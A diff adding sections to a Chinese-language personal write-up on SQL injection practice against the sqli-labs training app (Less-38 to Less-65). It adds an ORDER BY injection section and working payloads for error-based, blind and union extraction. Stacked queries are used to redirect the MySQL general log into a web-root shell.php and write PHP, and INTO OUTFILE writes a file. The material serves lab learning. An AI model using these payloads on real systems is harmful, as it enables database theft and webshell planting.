@@ -174,6 +174,57 @@ mysql> select floor(rand(14)*2) from information_schema.tables limit 0,8;
 
 
 
+#### 1.4.2 ORDER BY注入
+
+主要是不能使用联合注入，还有一些函数区别。
+
+**验证方式**
+
+升序降序
+
+```sql
+?sort=1 asc # 升序
+?sort=1 desc # 降序
+```
+
+`rand()`函数验证，`rand()`每次结果随机，因此查询出结果顺序也是随机。
+
+```sql
+?sort=rand()
+?sort=1 and rand()
+```
+
+延时验证，延时的时间为 (行数 * 1) 秒
+
+```sql
+?sort=sleep(1)
+?sort=1 and sleep(1)
+```
+
+**利用方式**
+
+报错注入
+
+```sql
+?sort=1 and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23 # floor()
+?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1) # procedure analyse
+```
+
+布尔盲注和时间盲注使用`rand()`函数即可
+
+```sql
+?sort=rand(left(database(),1)>'r')
+?sort=rand(if(ascii(substr(database(),1,1))>114,1,sleep(1)))
+```
+
+写入文件，使用`lines terminated by`，`0x3c3f70687020706870696e666f28293b3f3e`是`<php phpinfo();>`的十六进制编码。
+
+```sql
+?sort=1 into outfile "/var/www/html/less46.php" lines terminated by 0x3c3f70687020706870696e666f28293b3f3e
+```
+
+
+
 ## 2. SQL注入绕过
 
 
@@ -1252,3 +1303,279 @@ $ echo \'|iconv -f utf-8 -t utf-16
 #### 3.3.21 Less-37
 
 没区别。
+
+### 3.4 Less-38-53
+
+> 下面无特殊利用的就当做无区别了。
+
+#### 3.4.1 Less-38
+
+```php
+$id=$_GET['id'];
+
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+if (mysqli_multi_query($con1, $sql)):
+    "查询结果"
+else:
+    print_r(mysqli_error($con1));
+```
+
+产生堆叠的原因在于`mysqli_multi_query()`函数，它会执行一个或用分号隔开的多个SQL语句。
+
+堆叠注入可以直接写马GetShell。
+
+这里先查看mysql配置
+
+```bash
+mysql> show variables like 'general%';
++------------------+---------------------------------+
+| Variable_name    | Value                           |
++------------------+---------------------------------+
+| general_log      | OFF                             |
+| general_log_file | /var/lib/mysql/e783195a8830.log |
++------------------+---------------------------------+
+```
+
+可以看见默认没有开启，首先手动开启。
+
+```sql
+?id=1';set global general_log="ON";set global general_log_file='/var/www/html/Less-38/shell.php'%23
+```
+
+```bash
+mysql> show variables like 'general%';
++------------------+---------------------------------+
+| Variable_name    | Value                           |
++------------------+---------------------------------+
+| general_log      | ON                              |
+| general_log_file | /var/www/html/Less-38/shell.php |
++------------------+---------------------------------+
+```
+
+然后就可以写入php代码了
+
+```sql
+?id=1';select '<?php phpinfo();?>'%23
+```
+
+查看文件
+
+```bash
+$ cat /var/www/html/Less-38/shell.php
+250311 14:32:51    10 Connect   root@localhost on security
+                   10 Init DB   security
+                   10 Query     SELECT * FROM users WHERE id='1';select '<?php phpinfo();?>'#' LIMIT 0,1
+```
+
+成功写入，但是可能是权限的问题，没有成功执行。
+
+#### 3.4.2 Less-39
+
+无区别
+
+#### 3.4.3 Less-40
+
+无区别
+
+#### 3.4.4 Less-41
+
+无区别
+
+#### 3.4.5 Less-42
+
+类似于`Less-24`，少了一些过滤。
+
+#### 3.4.6 Less-43
+
+无区别。
+
+#### 3.4.7 Less-44
+
+无区别。
+
+#### 3.4.8 Less-45
+
+无区别。
+
+#### 3.4.9 Less-46
+
+```php
+$id=$_GET['sort'];
+
+$sql = "SELECT * FROM users ORDER BY $id";
+
+if true
+    "查询结果"
+else：
+    print_r(mysql_error());
+```
+
+`order by`注入，具体看本文order by注入部分。
+
+#### 3.4.10 Less-47
+
+无区别。
+
+#### 3.4.11 Less-48
+
+无区别。
+
+#### 3.4.12 Less-49
+
+无区别。
+
+#### 3.4.13 Less-50
+
+无区别。
+
+#### 3.4.14 Less-51
+
+无区别。
+
+#### 3.4.15 Less-52
+
+无区别。
+
+#### 3.4.16 Less-53
+
+无区别。
+
+### 3.5 Less54-65
+
+#### 3.5.1 Less-54
+
+```php
+$times= 10;
+
+if(isset($_POST['reset']))
+    setcookie('challenge', ' ', time() - 3600000);
+
+else:
+    if(isset($_COOKIE['challenge']))
+        $sessid=$_COOKIE['challenge'];
+    else:
+        $expire = time()+60*60*24*30;
+        $hash = data($table,$col);
+        setcookie("challenge", $hash, $expire);
+    if $_GET['id']:
+        $sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1";
+    if true
+        "查询结果"
+    else：
+       
+$key = addslashes($_POST['key']);
+$key = mysql_real_escape_string($key);
+$sql="SELECT 1 FROM $table WHERE $col1= '$key'";
+```
+
+十次以内查出结果
+
+判断闭合
+
+```sql
+?id=1'
+?id=1'%23
+```
+
+判断字段数
+
+```sql
+?id=1'order by 3%23
+?id=1'order by 4%23
+```
+
+查数据库名
+
+```sql
+?id=-1'union select 1,2,(select group_concat(schema_name) from information_schema.schemata)%23
+information_schema,challenges,mysql,performance_schema,security
+```
+
+查表名
+
+```sql
+?id=-1'union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='challenges')%23
+1KBD9AIPC9
+```
+
+查字段名
+
+```sql
+?id=-1'union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='1KBD9AIPC9')%23
+id,sessid,secret_2TF1,tryy
+```
+
+查key值
+
+```sql
+?id=-1'union select 1,2,(select concat(secret_2TF1) from challenges.1KBD9AIPC9)%23
+vJWlm4ld9mZEZN2o7n59t4A8
+```
+
+总共八次。
+
+#### 3.5.2 Less-55
+
+无区别。
+
+#### 3.5.3 Less-56
+
+无区别。
+
+#### 3.5.4 Less-57
+
+无区别。
+
+#### 3.5.5 Less-58
+
+```php
+$sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1";
+if true
+    echo 'Your Login name : '. $unames[$row['id']];
+    echo 'Your Password : ' .$pass[$row['id']];
+else
+    print_r(mysql_error());
+```
+
+联合查询没结果输出，改为报错注入。
+
+#### 3.5.6 Less-59
+
+无区别。
+
+#### 3.5.7 Less-60
+
+无区别。
+
+#### 3.5.8 Less-61
+
+无区别。
+
+#### 3.5.9 Less-62
+
+```php
+$sql="SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1";
+if true
+    echo 'Your Login name : '. $unames[$row['id']];
+    echo 'Your Password : ' .$pass[$row['id']];
+else
+    //print_r(mysql_error());
+```
+
+不能报错注入了，改为布尔盲注或者时间盲注即可
+
+#### 3.5.9 Less-63
+
+无区别。
+
+#### 3.5.10 Less-64
+
+无区别。
+
+#### 3.5.1 Less-65
+
+无区别。
+
+### 3.6 总结
+
+终于是刷完了，总体来说把每种注入方式都练习了个遍，并学习了一些绕过手法，整个过程除了`Less-1`跟着大佬把`sqlmap`使用熟悉了一下，其余均为手注，加强自己的能力，尽量不变成离了脚本就活不了的脚本小子（）。但是其实还有许多利用手法没有学到，以后遇到就在本文填补，避免做完就忘了。
